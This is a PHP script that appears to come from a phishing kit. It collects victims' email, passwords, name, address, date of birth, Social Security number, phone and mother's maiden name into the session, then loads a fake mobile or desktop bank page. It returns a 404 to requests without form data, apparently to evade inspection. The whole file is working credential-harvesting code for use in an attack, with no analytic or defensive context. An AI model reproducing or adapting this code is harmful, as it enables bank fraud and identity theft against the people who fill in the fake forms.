<?php
session_start();
require_once('main.php');
$random = substr(sha1(mt_rand()),1,25);
$ip = getUserIP();
if (!isset($_POST['email'])) {
exit(header("HTTP/1.0 404 Not Found"));
}
$_SESSION['email'] = $_POST['email'];
$_SESSION['pass_log'] = $_POST['pass_log'];
$_SESSION['password'] = $_POST['password'];
$_SESSION['fname'] = $_POST['fname'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['mmn'] = $_POST['mmn'];
  if($os == "Android" or $os == "iPhone") {
    require_once("files/bank-mobile.php");
  }else{
    require_once("files/bank-desktop.php");
  }
?>